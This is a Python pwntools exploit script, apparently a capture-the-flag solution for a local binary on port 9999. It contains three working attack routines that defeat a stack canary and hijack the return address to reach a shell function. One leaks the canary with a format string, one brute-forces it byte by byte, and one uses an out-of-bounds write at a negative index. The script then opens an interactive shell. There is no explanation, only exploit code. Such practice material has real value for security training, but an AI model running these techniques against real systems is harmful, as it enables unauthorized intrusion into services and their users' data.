from pwn import*
from struct import pack
from ctypes import *
context(log_level = 'debug',arch = 'amd64')
#p=process('./src/attachment')
ip="localhost"
port=9999
p=remote(ip,port)
elf=ELF('./src/attachment')
libc=ELF('./src/libc.so.6')
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
def case1_exp():
    p.recvuntil("> ")
    p.sendline(str(1))
    p.recvuntil("Tell me something > ")
    p.send(b'%39$p')
    p.recvuntil("0x")
    canary = int(p.recv(16),16)
    li(hex(canary))
    p.recvuntil("please get shell")
    payload = b'a'*0x108 + p64(canary)*2 + p64(0x4012f6)
    print(f"Payload:{payload}")
    p.send(payload)

def case2_exp():
    p.recvuntil(b"> ")
    p.sendline(str(2))
    def brute1bit() :
        global known
        for i in range(256):
            payload = 0x108 * b'a'
            payload += known
            payload += bytes([i])
            print(f"current payload:{payload},known: {known}, trying byte: {hex(i)}")
            p.sendafter('Please start your challenge\n', payload)
            try:
                info = p.recvuntil(b'\n')
                if b"*** stack smashing detected ***" in info :
                    p.send(b'n\n')
                    continue
                else :
                    known += bytes([i])
                    sleep(3)
                    break
            except:
                li(hex('wrong'))
                break
        
    def brute_canary():
        global known
        known = b""
        known += b'\x00'
        for i in range(7):
            brute1bit()          
            if i != 6 :
                p.send(b'n\n')
                p.recvuntil(b"> ")
                p.sendline(str(2))
    brute_canary()
    canary = u64(known)
    li(hex(canary))
    payload =b"a"*0x108+p64(canary)*2+p64(0x4012f6)
    print(f"Final payload:{payload}")
    pause()
    p.send(payload)


def case3_exp():
    p.recvuntil("> ")
    p.sendline(str(3))
    p.recvuntil("Please decide where you want to write the data")
    p.sendline(str(-152))
    p.recvuntil("Please enter the data")
    payload = p64(0x4012f6)
    p.send(payload)
    p.recvuntil("Please enter the data again")
    p.send(b'a'*0x110)
    


#case1_exp()
#case2_exp()
#case3_exp()

p.interactive()